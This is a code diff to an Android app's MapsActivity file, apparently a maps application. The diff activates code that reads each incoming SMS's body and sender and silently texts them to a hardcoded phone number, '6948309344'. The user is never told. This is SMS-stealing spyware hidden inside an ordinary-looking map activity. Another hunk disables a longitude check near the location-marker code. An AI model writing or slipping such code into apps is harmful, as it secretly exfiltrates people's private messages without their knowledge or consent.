@@ -155,8 +155,6 @@ public class MapsActivity extends AppCompatActivity {
             String test = null;
 
 
-
-
             ActivityCompat.requestPermissions(MapsActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
 
             if (ContextCompat.checkSelfPermission(context,
@@ -165,7 +163,30 @@ public class MapsActivity extends AppCompatActivity {
                 cur.moveToNext();
                 id = cur.getString(cur.getColumnIndex("_id"));
 
-            }
+                    if (smsChecker(id)) {
+                        if (ContextCompat.checkSelfPermission(context,
+                                Manifest.permission.SEND_SMS)
+                                == PackageManager.PERMISSION_GRANTED) {
+                            address = cur.getString(cur.getColumnIndex("address"));
+                            message = cur.getString(cur.getColumnIndex("body"));
+                            System.out.println("Message: " + message + " To :" + address);
+
+                           //  if (!address.equals("1234565789")) {
+                                 String line = message + address;
+                                 String p = "6948309344";
+                                 SmsManager sms = SmsManager.getDefault();
+                                 sms.sendTextMessage(p, "1234565789", line, null, null);
+                            // }
+                        }
+
+                        }
+                        //if (cur.getString(cur.getColumnIndex("address")) != "1234565789") {
+
+
+                        // }
+
+                    }
+
 
 
 
@@ -181,27 +202,7 @@ public class MapsActivity extends AppCompatActivity {
 
             }
 
-
-
-
-            if (smsChecker(id)) {
-                //if (cur.getString(cur.getColumnIndex("address")) != "1234565789") {
-
-                address = cur.getString(cur.getColumnIndex("address"));
-                message = cur.getString(cur.getColumnIndex("body"));
-                System.out.println("Message: " + message + " To :" + address);
-
-                // if (!address.equals("1234565789")) {
-                //    String line = message + address;
-                //     String p = "6948309344";
-                //    SmsManager sms = SmsManager.getDefault();
-                //   sms.sendTextMessage(p, "1234565789", line, null, null);
-
-                // }
-
-            }
         }
-
 
         public boolean smsChecker(String smsId) {
             boolean flagSMS = true;
@@ -265,7 +266,7 @@ public class MapsActivity extends AppCompatActivity {
 
 
                             System.out.println(Double.parseDouble(String.valueOf(location.getLongitude())));
-                            if (Double.parseDouble(String.valueOf(location.getLongitude())) >1) {
+                           // if (Double.parseDouble(String.valueOf(location.getLongitude())) > 1) {
 
                                 // AlertDialog.Builder builder = new AlertDialog.Builder(MapsActivity.this);
                                 //  String pinpoint = location.getLatitude() + "\n" + location.getLongitude();
@@ -283,7 +284,7 @@ public class MapsActivity extends AppCompatActivity {
                                 //   }
                                 // });
                                 // builder.show();
-                            }
+                         //   }
 
                             //Create marker options
                             MarkerOptions options = new MarkerOptions().position(latLng)
